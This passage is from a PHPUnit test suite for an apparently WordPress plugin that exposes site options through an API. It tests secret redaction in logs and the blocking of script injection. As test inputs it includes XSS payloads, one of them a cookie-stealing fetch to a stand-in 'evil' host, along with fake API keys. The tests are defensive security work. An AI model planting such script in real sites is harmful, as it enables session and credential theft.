		$this->assertSame( 'elementor_probe', $out['requests'][0]['key'] );
		$this->assertSame( '[redacted]', $out['requests'][0]['value']['api_key'] );

		$out = Mcpwp_Option_Access::redact_for_log( array( 'credentials' => array( 'key' => 'sk-live-AbCd1234EfGh5678IjKl', 'value' => 1 ) ), $keys );
		$this->assertSame( '[redacted]', $out['credentials']['key'], 'A credential-shaped "name" is not a name.' );
		$out = Mcpwp_Option_Access::redact_for_log( array( 'headers' => array( array( 'key' => 'ghp_AbCd1234EfGh5678IjKlMnOp', 'value' => 'x' ) ) ), $keys );
		$this->assertSame( '[redacted]', $out['headers'][0]['key'] );
	}

	public function test_opaque_means_an_object_marker_not_the_letters_o_colon(): void {
		$this->assertFalse( Mcpwp_Option_Access::is_opaque_serialized( 's:5:"O:abc";' ) );
		$this->assertFalse( Mcpwp_Option_Access::is_opaque_serialized( serialize( array( 'note' => 'see O: section' ) ) ) ); // phpcs:ignore
		$this->assertTrue( Mcpwp_Option_Access::is_opaque_serialized( 'O:8:"MyClass1":0:{}' ) );
		$this->assertTrue( Mcpwp_Option_Access::is_opaque_serialized( 'a:1:{s:1:"x";O:8:"MyClass1":0:{}}' ) );
		$this->assertSame( array(), Mcpwp_Option_Access::secret_paths_in_write( 'elementor_probe', array( 'v' => 's:5:"O:abc";' ) ) );
	}

	public function test_a_nested_stdclass_in_a_stored_native_value_survives_an_untouched_write(): void {
		// Round-6 P2-3.
		$gw          = new stdClass();
		$gw->api_key = 'sk_live_AbCdEf12345678';
		$gw->mode    = 'test';
		update_option( 'elementor_probe', array( 'gw' => $gw, 'label' => 'a' ) );

		$this->write( 'elementor_probe', array( 'label' => 'b' ) );
		$stored = get_option( 'elementor_probe' );
		$this->assertInstanceOf( stdClass::class, $stored['gw'] );
		$this->assertSame( 'sk_live_AbCdEf12345678', $stored['gw']->api_key );
		$this->assertSame( 'b', $stored['label'] );

		// A {} the caller sends INTO a native array option is an array, as
		// WordPress code reads it.
		update_option( 'elementor_probe', array( 'mode' => 'test' ) );
		$this->write( 'elementor_probe', '{"mode":"live","extra":{"a":1}}' );
		$this->assertIsArray( get_option( 'elementor_probe' )['extra'] );
	}

	public function test_a_leaf_whose_encoding_changed_is_stored_as_sent_and_the_caller_is_warned(): void {
		// Round-6 P2-4.
		update_option( 'elementor_probe', array( 'gw' => serialize( array( 'mode' => 'test' ) ) ) ); // phpcs:ignore
		$written = $this->write( 'elementor_probe', array( 'gw' => '{"mode":"live"}' ) );
		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		$this->assertSame( '{"mode":"live"}', get_option( 'elementor_probe' )['gw'] );
		$this->assertSame( array( 'gw: stored serialised, submitted json; stored as submitted' ), $written->get_data()['warnings'] );
	}

	// ---------------------------------------------------------------
	// Round 8: what renders raw is read-only; active markup needs admin;
	// the root is an ancestor; logs redact before they truncate.
	// ---------------------------------------------------------------

	public function test_widget_and_sidebar_options_are_readable_but_never_written_through_the_option_api(): void {
		// Round-7 P0-1: widget_text / widget_block render raw to visitors;
		// core's KSES lives in WP_Widget::update(), which update_option()
		// bypasses. These are managed through the widgets routes.
		update_option( 'widget_text', array( 2 => array( 'title' => 'Hi', 'text' => 'plain' ), '_multiwidget' => 1 ) );
		$this->assertInstanceOf( WP_REST_Response::class, $this->read( 'widget_text' ) );

		foreach ( array( 'widget_text', 'widget_block', 'sidebars_widgets' ) as $option ) {
			$refused = $this->write( $option, array( 2 => array( 'text' => '<script>fetch("//evil/?c="+document.cookie)</script>' ) ) );
			$this->assertInstanceOf( WP_Error::class, $refused, $option );
			$this->assertSame( 'forbidden_option', $refused->get_error_code(), $option );
			$this->assertStringStartsWith( 'write_protected:', $refused->get_error_data()['rule'], $option );
		}
		$this->assertSame( 'plain', get_option( 'widget_text' )[2]['text'] );
	}

	public function test_active_markup_is_stored_only_by_an_admin_scoped_key(): void {
		$GLOBALS['mcpwp_test_filters'] = array();
		$designer = ( new Mcpwp_REST_Site_Settings() )->create_scoped_api_key( 'designer', array( 'read', 'write' ), 'designer' );
		$admin    = ( new Mcpwp_REST_Site_Settings() )->create_scoped_api_key( 'admin', array( 'read', 'write', 'admin' ), 'admin' );

		// The REST route table already holds the option routes to admin scope;
		// the MCP tool path reaches the handler with the key record set. The
		// handler's own gate is what is exercised here, so the record is set
		// the way that path sets it (a normalised record with its scopes).
		$write_as = function ( array $key, $value ) {
			$controller = new Mcpwp_REST_Site_Settings();
			$prop       = new ReflectionProperty( Mcpwp_REST_API::class, 'current_api_key_record' );
			$prop->setAccessible( true );
			$prop->setValue( $controller, array( 'id' => $key['id'], 'scopes' => $key['scopes'], 'role' => $key['role'], 'allow_destructive' => false ) );
			$request = new WP_REST_Request( 'POST', '/mcpwp/v1/option', array( 'key' => 'elementor_probe', 'value' => $value ) );
			return $controller->update_option_handler( $request );
		};

		foreach ( array( '<script>x</script>', array( 'html' => '<img src=x onerror=alert(1)>' ), '{"a":"<a href=\"javascript:alert(1)\">x</a>"}', '<iframe srcdoc="x"></iframe>' ) as $payload ) {
			$refused = $write_as( $designer, $payload );
			$this->assertInstanceOf( WP_Error::class, $refused );
			$this->assertSame( 'active_markup_requires_admin', $refused->get_error_code() );
		}
		$this->assertFalse( get_option( 'elementor_probe' ) );

		// Ordinary HTML is fine for anyone; active markup is fine for an admin.
		$this->assertInstanceOf( WP_REST_Response::class, $write_as( $designer, array( 'footer' => '<p>Hi <b>there</b></p><a href="https://x/?r=a%2Fb">x</a>' ) ) );
		$this->assertInstanceOf( WP_REST_Response::class, $write_as( $admin, array( 'js' => '<script>x</script>' ) ) );
		$this->assertSame( '<script>x</script>', get_option( 'elementor_probe' )['js'] );
	}

	public function test_a_scalar_over_a_stored_encoded_string_is_refused_at_the_root_too(): void {
		// Round-7 P0-2: the root was short-circuited past the ancestor walk.
		foreach ( array( '{"secret_key":"sk_live_AbCdEf12345678","mode":"live"}', serialize( array( 'secret_key' => 'sk_live_AbCdEf12345678', 'mode' => 'live' ) ) ) as $stored ) { // phpcs:ignore
			update_option( 'woocommerce_probe', $stored );
			foreach ( array( 'disabled', '' ) as $scalar ) {
				$refused = $this->write( 'woocommerce_probe', $scalar );
				$this->assertInstanceOf( WP_Error::class, $refused, $scalar );
				$this->assertSame( 'secret_write_refused', $refused->get_error_code() );
				$this->assertSame( array( 'secret_key' ), $refused->get_error_data()['secret_paths'] );
				$this->assertSame( $stored, get_option( 'woocommerce_probe' ), 'Nothing was written.' );
			}
			$written = $this->write( 'woocommerce_probe', 'disabled', array( 'allow_secrets' => true ) );
			$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
			$this->assertSame( 'disabled', get_option( 'woocommerce_probe' ) );
		}

		$merged = Mcpwp_Option_Access::merge_preserving_secrets( 'k', '{"secret_key":"sk_live_AbCdEf12345678"}', 'disabled', false );
		$this->assertSame( array( 'secret_key' ), $merged['refused'] );
		$this->assertArrayHasKey( 'warnings', $merged );

		// A structure holding only a FLAG under a secret-ish name may be replaced.
		update_option( 'woocommerce_probe', array( 'reg' => array( 'generate_password' => 'no' ) ) );
		$this->assertInstanceOf( WP_REST_Response::class, $this->write( 'woocommerce_probe', array( 'reg' => 'disabled' ) ) );
		$this->assertSame( 'disabled', get_option( 'woocommerce_probe' )['reg'] );
		update_option( 'woocommerce_probe', '{"generate_password":"no"}' );
		$this->assertInstanceOf( WP_REST_Response::class, $this->write( 'woocommerce_probe', 'off' ) );
	}

	public function test_a_list_where_a_map_holding_a_credential_was_stored_is_a_replacement(): void {
		// Round-7 P2-9.
		update_option( 'elementor_probe', array( 'a' => array( 'b' => array( 'password' => 'Hunter2LiveSecret' ) ) ) );
		$refused = $this->write( 'elementor_probe', array( 'a' => array( 'x', 'y' ) ) );
		$this->assertSame( 'secret_write_refused', $refused->get_error_code() );
		$this->assertSame( array( 'a.b.password' ), $refused->get_error_data()['secret_paths'] );

		// {} is not a list: the credential is preserved into it.
		$written = $this->write( 'elementor_probe', array( 'a' => array() ) );
		$this->assertInstanceOf( WP_REST_Response::class, $written );
		$this->assertSame( 'Hunter2LiveSecret', get_option( 'elementor_probe' )['a']['b']['password'] );
	}

	public function test_the_activity_log_redacts_before_it_truncates(): void {
		// Round-7 P0-3: a >500-char JSON value was truncated first, so the
		// walker could not open it and the credential was logged verbatim.
		$GLOBALS['mcpwp_test_wpdb_rows'] = array();
		update_option( 'mcpwp_settings', array( 'enable_logging' => true ) );
		update_option( 'woocommerce_probe', array( 'mode' => 'test' ) );

		$big = wp_json_encode( array( 'pad' => str_repeat( 'x', 600 ), 'smtp' => array( 'pass' => 'Hunter2LivePassword' ) ) );
		$this->write( 'woocommerce_probe', $big );

		$rows = wp_json_encode( $GLOBALS['mcpwp_test_wpdb_rows'] );
		$this->assertStringNotContainsString( 'Hunter2LivePassword', $rows );
		$this->assertStringContainsString( 'truncated', $rows, 'Still truncated, after redaction.' );
	}

	public function test_a_value_wordpress_alters_on_store_is_reported_as_stored_not_as_a_failure(): void {
		// Round-7 P1-5: the write landed (altered by sanitize_option) and
		// the API said 500.
		$GLOBALS['mcpwp_test_option_store_hook'] = function ( $name, $value ) {
			return 'blogname' === $name && is_string( $value ) ? strip_tags( $value ) : $value;
		};
		update_option( 'blogname', 'Old');
		$written = $this->write( 'blogname', '  My <b>Site</b>  ' );
		unset( $GLOBALS['mcpwp_test_option_store_hook'] );

		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		$this->assertSame( 'My Site', get_option( 'blogname' ), 'Trimmed (core text key) and altered by the store.' );
		$this->assertSame( 'My Site', $written->get_data()['value'] );
		$this->assertNotEmpty( $written->get_data()['warnings'] );

		// A value the store refuses outright is a 409, not a 500 and not a lie.
		$GLOBALS['mcpwp_test_option_store_hook'] = function ( $name, $value ) { return 'blogname' === $name ? null : $value; };
		$refused = $this->write( 'blogname', 'Other' );
		unset( $GLOBALS['mcpwp_test_option_store_hook'] );
		$this->assertInstanceOf( WP_Error::class, $refused );
		$this->assertSame( 'update_failed', $refused->get_error_code() );
		$this->assertSame( 409, $refused->get_error_data()['status'] );
	}

	public function test_only_option_name_shaped_keys_are_kept_in_the_log(): void {
		// Round-7 P2-7.
		foreach ( array( 'woocommerce_api_key', 'blogname', 'wpseo_titles', 'elementor_probe', 'my-plugin.setting' ) as $name ) {
			$this->assertTrue( Mcpwp_Option_Access::is_option_name_shaped( $name ), $name );
		}
		foreach ( array( 'a1b2c3d4e5f6a1b2c3d4e5f6', '550e8400-e29b-41d4-a716-446655440000', 'AKIAIOSFODNN7EXAMPLE', 'abcdef0123456789abcdef0123456789abcdef01', 'ghp_AbCd1234EfGh5678IjKlMnOp', 'x' ) as $name ) {
			$this->assertFalse( Mcpwp_Option_Access::is_option_name_shaped( $name ), $name );
		}
		$out = Mcpwp_Option_Access::redact_for_log( array( 'key' => 'a1b2c3d4e5f6a1b2c3d4e5f6', 'value' => 1 ), array() );
		$this->assertSame( '[redacted]', $out['key'] );
	}

	public function test_every_log_uses_the_sites_redaction_key_list(): void {
		// Round-7 P2-6: three lists that should be one.
		update_option( 'mcpwp_settings', array( 'log_redaction_keys' => array( 'Customer_PIN' ) ) );
		$keys = Mcpwp_Option_Access::log_redaction_keys();
		$this->assertContains( 'customer_pin', $keys );
		$this->assertContains( 'api_key', $keys, 'The installed defaults stay.' );
		$this->assertContains( 'client_secret', $keys );

		if ( ! class_exists( 'Mcpwp_Action_Log' ) ) {
			require_once dirname( __DIR__ ) . '/includes/core/class-mcpwp-action-log.php';
		}
		$GLOBALS['mcpwp_test_wpdb_rows'] = array();
		$log_id = Mcpwp_Action_Log::begin( 'wp_update_option', array( 'key' => 'elementor_probe', 'value' => array( 'customer_pin' => '4242' ) ), 'k1', 'site' );
		Mcpwp_Action_Log::complete( $log_id, 1, true, '' );
		$this->assertStringNotContainsString( '4242', wp_json_encode( $GLOBALS['mcpwp_test_wpdb_rows'] ) );
	}
}
